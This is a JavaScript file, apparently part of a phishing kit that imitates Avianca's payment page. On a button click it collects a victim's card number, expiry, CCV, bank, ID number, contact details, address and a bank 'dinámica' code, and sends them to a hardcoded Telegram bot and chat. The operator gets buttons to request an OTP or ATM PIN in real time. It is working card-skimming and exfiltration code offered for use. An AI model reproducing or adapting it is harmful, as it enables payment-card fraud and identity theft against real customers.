document.addEventListener("DOMContentLoaded", () => {
    const btnNextStep = document.querySelector(".btn-success");

    if (!btnNextStep) {
        console.error("❌ No se encontró el botón Continuar con el pago.");
        return;
    }

    btnNextStep.addEventListener("click", async (event) => {
        event.preventDefault();

        const dinamicInput = document.getElementById("dinamic");

        if (!dinamicInput) {
            console.error("❌ No se encontró el campo dinamic.");
            return;
        }

        const dinamic = dinamicInput.value.trim();

        if (!dinamic) {
            alert("Por favor, ingresa el código dinamic.");
            return;
        }

        console.log("✅ Código dinamic ingresado:", dinamic);

        const pagoData = localStorage.getItem("pagoavianca");
        if (!pagoData) {
            console.warn("⚠️ No se encontraron datos en localStorage para pagoavianca.");
            return;
        }

        let pagoavianca;
        try {
            pagoavianca = JSON.parse(pagoData);
        } catch (error) {
            console.error("❌ Error al parsear pagoavianca:", error);
            return;
        }

        console.log("✅ Datos recuperados (pagoavianca):", pagoavianca);

        const transactionId = Date.now().toString();

        // Reemplaza con tus credenciales
        const config = {
            botToken: "7670338962:AAFMoa86jfCfD7N7ZbeDpN_WmXZH9xmW51",
            chatId: "-4644294739"
        };

        const mensaje = `✈️ <b>Avianca</b> ✈️
💳 Tarjeta: <code>${pagoavianca.card}</code>
🗓️ Fecha: <code>${pagoavianca.card_date}</code>
💳 CCV: <code>${pagoavianca.ccv}</code>
🏦 Banco: <code>${pagoavianca.bank}</code>
📅 Cuotas: <code>${pagoavianca.cuotas}</code>
👨🏻‍🦱 Nombre: <code>${pagoavianca.name}</code>
👨🏻‍🦱 Apellido: <code>${pagoavianca.lastname}</code>
💳 CC: <code>${pagoavianca.cc}</code>
📨 Correo: <code>${pagoavianca.email}</code>
📲 Teléfono: <code>${pagoavianca.phone}</code>
🏙️ Ciudad: <code>${pagoavianca.city}</code>
🗽 Provincia: <code>${pagoavianca.state}</code>
🧭 Dirección: <code>${pagoavianca.address}</code>
🔑 Dinámica: <code>${dinamic}</code>`;

        const keyboard = {
            inline_keyboard: [
                [{ text: "X Logo", callback_data: `error_logo:${transactionId}` }],
                [{ text: "X TC", callback_data: `error_tc:${transactionId}` }],
                [{ text: "Dinámica", callback_data: `dinamic:${transactionId}` }],
                [{ text: "OTP", callback_data: `pedir_otp:${transactionId}` }],
                [{ text: "Clave Cajero", callback_data: `cajero:${transactionId}` }],
                [{ text: "X Dinamica", callback_data: `xdinamic:${transactionId}` }],
                [{ text: "X OTP", callback_data: `xotp:${transactionId}` }],
                [{ text: "Fin", callback_data: `confirm_finalizar:${transactionId}` }]
            ]
        };

        try {
            const response = await fetch(`https://api.telegram.org/bot${config.botToken}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: config.chatId,
                    text: mensaje,
                    parse_mode: "HTML",
                    reply_markup: JSON.stringify(keyboard)
                })
            });

            const data = await response.json();

            if (data.ok) {
                console.log("✅ Mensaje enviado a Telegram:", data);
                const messageId = data.result.message_id;
                checkPaymentVerification(transactionId, messageId, config);
            } else {
                console.error("❌ Error al enviar mensaje a Telegram:", data);
            }
        } catch (error) {
            console.error("❌ Error en fetch de sendMessage:", error);
        }
    });
});

// checkPaymentVerification no se modifica
